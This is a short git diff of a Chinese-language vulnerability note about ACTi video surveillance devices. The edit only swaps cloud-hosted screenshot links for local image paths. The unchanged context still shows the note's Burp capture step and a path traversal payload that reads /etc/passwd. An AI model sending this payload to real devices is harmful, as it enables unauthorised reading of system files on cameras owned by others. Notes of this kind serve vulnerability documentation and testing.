@@ -20,7 +20,7 @@ app="ACTi-视频监控"
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140926386.png)
+![](./images/202202140926386.png)
 
 使用Burp抓包
 
@@ -28,4 +28,4 @@ app="ACTi-视频监控"
 /images/../../../../../../../../etc/passwd
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140926873.png)
+![](./images/202202140926873.png)
